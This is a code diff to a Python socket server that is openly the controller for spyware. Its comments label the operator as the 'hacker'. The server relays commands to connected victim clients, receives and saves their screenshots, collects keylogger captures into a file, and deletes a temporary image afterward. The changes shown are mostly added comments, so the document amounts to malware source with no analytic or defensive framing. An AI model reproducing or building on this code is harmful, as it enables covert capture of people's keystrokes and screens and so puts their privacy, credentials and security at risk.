@@ -4,9 +4,11 @@ import threading
 import os
 
 def receive_prt_sc(client, n):
+    # CHANGE THE SCREENSHOT'S NAME
     screenshot = 'screenshot-' + str(n) + ".jpg"  
     with open(screenshot, 'wb') as file:
         while True:
+            # RECEIVE AND WRITE SCREENSHOT
             data = client.recv(1024)
             if not data:
                 break
@@ -19,21 +21,25 @@ def handle_print_screen(client):
     n = 0
     while True:
         while True:
+            # RECEIVE HACKER'S INPUT
             request = input()
+            # SEND TO CLIENT TO MATCH COMMANDS
             client.send(request.encode('utf-8'))
+            # PRINT SOLICITATION
             if request == 'PRINT':
                 receive_prt_sc(client, n)
                 n += 1
             elif request == 'EXIT':
                 break
 
-        # CLOSE CONNECTION WITH CLIENT
+        # CLEANS UP
         os.system("rm img.jpg")
         client.close()
         
 def handle_keylogger(client):
     while True:
         print("[+] Receiving the keylogger from client each 10 seconds")
+        # WRITE KEYLOGGER BACKDOOR
         with open('keylogger.txt', 'wb') as arquivo:
             while True:
                 data = client.recv(1024)  
@@ -66,7 +72,7 @@ def handle_clients(client, id):
         print('[-] There is no function for this client')
 
 
-# CREATE A SERVER, RECEIVE FILE FROM CLIENT AND WRITE IT IN A FILE
+# CREATE A SERVER, RECEIVE BACKDOOR FROM CLIENT
 def server_init(server_address, port_address):
     # CREATE SERVER SOCKET
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -76,15 +82,14 @@ def server_init(server_address, port_address):
 
     # PUT SOCKET TO LISTEN
     server.listen()
-
     print(f"[+] Server listening on {server_address}:{port_address}")
+    print("...WAITING...")
     
-    # IDENTIFICATION OF CLIENTS
+    # CLIENT'S ID
     client_id = 0
 
     while True:
         # WAIT TO CLIENT CONNECT
-        print("...WAITING...")
         client, client_address = server.accept()
         print(f"[+] Client {client_address} connected")
 
@@ -92,6 +97,7 @@ def server_init(server_address, port_address):
         client_thread = threading.Thread(target=handle_clients, args=(client, client_id))
         client_thread.start()
 
+        # INCREASE ID
         client_id += 1
 
 # EXECUTE PROGRAM
